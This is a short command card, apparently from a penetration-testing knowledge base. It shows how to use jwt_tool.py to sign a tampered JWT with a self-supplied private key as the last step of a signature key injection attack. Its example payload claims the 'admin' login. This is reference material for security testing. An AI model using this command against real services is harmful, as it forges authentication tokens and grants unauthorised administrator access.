---
type: command
executor: bash
data: python3 jwt_tool.py $_UNSIGNED_JWT -S -k $_PRIVATE_KEY_PEM
tags:
  - jwt
  - sign
  - tamper
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# jwt-tool-sign-token

## Command

```bash
python3 jwt_tool.py $_UNSIGNED_JWT -S -k $_PRIVATE_KEY_PEM
```

## Description

Signs an unsigned or tampered JWT using a custom private key, completing the key injection process.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_UNSIGNED_JWT | Header.payload without signature | Yes |
| -S | Signing mode | Yes |
| -k $_PRIVATE_KEY_PEM | Path to private key PEM file | Yes |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIs... . eyJsb2dpbiI6ImFkbWluIn0 -S -k private_key.pem
```

## Expected Output

Signed JWT: eyJhbGciOiJSUzI1NiIs... . eyJsb2dpbiI6ImFkbWluIn0 . [new_signature]

## Related

- [[procedures/JWT-Signature-Key-Injection-Attack]]
- [[tools/jwt-tool]]
